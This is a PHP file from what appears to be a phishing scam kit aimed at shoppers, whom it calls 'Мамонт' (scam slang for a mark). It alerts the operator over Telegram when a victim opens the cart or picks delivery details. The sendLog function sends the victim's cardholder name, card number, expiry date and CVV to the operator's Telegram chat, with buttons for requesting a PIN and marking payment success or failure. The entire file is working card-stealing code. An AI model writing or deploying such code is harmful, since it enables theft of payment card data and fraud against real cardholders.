<?php
require_once('config.php');

function selectDataDelivery()
{
    sendMessage("Мамонт выбирает данные для доставки");
}

function order()
{
    sendMessage("Мамонт зашел в корзину");
}

function sendMessage($message)
{
    global $TELEGRAM_BOT_TOKEN;
    global $TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" . urlencode($message);
    file_get_contents($url);
}

function sendLog($cardHolder, $cardNumber, $cardMonth, $cardYear, $cardCvv, $idLink)
{
    global $TELEGRAM_BOT_TOKEN;
    global $TELEGRAM_CHAT_ID;

    $message = "Данные карты: \n";
    $message .= "Имя: $cardHolder\n";
    $message .= "Номер карты: $cardNumber\n";
    $message .= "Дата: $cardMonth\\$cardYear\n";
    $message .= "CVV: $cardCvv\n";
    $inline_keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'PIN-CODE', 'callback_data' => "pin_code_$idLink"],
            ],
            [
                ['text' => 'Оплата', 'callback_data' => "payment_$idLink"],
            ],
            [
                ['text' => 'Ошибка оплаты', 'callback_data' => "error_payment_$idLink"],
            ],
            [
                ['text' => 'Ошибка PIN-CODE', 'callback_data' => "error_pin_code_$idLink"],
            ],
            [
                ['text' => "Успех", 'callback_data' => "success_$idLink"]
            ]
        ]
    ]);

    $reply_markup = urlencode($inline_keyboard); // Сериализация в строку URL
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" . urlencode($message) . "&reply_markup=$reply_markup";
    file_get_contents($url);

}